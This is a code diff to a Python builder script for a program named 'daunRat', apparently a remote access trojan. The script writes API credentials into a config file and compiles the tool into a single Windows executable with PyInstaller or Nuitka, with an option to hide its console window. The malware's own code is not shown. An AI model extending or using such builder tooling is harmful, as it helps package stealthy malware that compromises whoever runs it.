@@ -24,7 +24,7 @@ except:
         json.dump(settings, f)
 
 
-def build():
+def build(mode: str) -> None:
     with open('env.py', 'w') as f:
         f.write(f"""
 app_id = "{settings["app_id"]}"
@@ -33,8 +33,17 @@ secret = "{settings["secret"]}"
 cluster = "{settings["cluster"]}"
 client_id = "{settings["client_id"]}"
 """)
-    os.system(f'venv\\Scripts\\activate.bat & pyinstaller --onefile --icon "{settings["icon"]}" {settings["terminal"]} '
-              f'--add-data "daun/modules;." daunRat.py')
+    if mode == 'pyinstaller':
+        os.system(f'venv\\Scripts\\activate.bat & pyinstaller --onefile --icon "{settings["icon"]}" '
+                  f'{settings["terminal"]} --add-data "daun/modules;." daunRat.py')
+        print(f"Output exe saved to {os.getcwd()}\\dist")
+    elif mode == 'nuitka':
+        os.system(f'venv\\Scripts\\activate.bat & '
+                  f'nuitka --standalone --assume-yes-for-downloads --remove-output --disable-dll-dependency-cache '
+                  f'--onefile --windows-icon-from-ico={settings["icon"]} '
+                  f'{"--windows-disable-console" if settings["terminal"] == "--windowed" else ""} '
+                  f'daunRat.py')
+        print(f"Output exe saved to {os.getcwd()}")
     input("Press enter to continue...")
 
 
@@ -47,7 +56,8 @@ def update_settings(key: str, value: str) -> None:
 
 while True:
     {
-        "build": build,
+        "pyinstaller": lambda: build('pyinstaller'),
+        "nuitka": lambda: build('nuitka'),
         "icon": lambda: update_settings("icon", input("icon path: ")),
         "app_id": lambda: update_settings("app_id", input("app_id: ")),
         "key": lambda: update_settings("key", input("key: ")),
@@ -58,7 +68,11 @@ while True:
         "show": lambda: update_settings("terminal", "--console")
     }[
         ezztui.menu({
-            'build': 'return',
+            'build': {
+                'pyinstaller': 'return',
+                'nuitka': 'return',
+                'back': 'back'
+            },
             'settings': {
                 'icon': 'return',
                 'console visibility': {
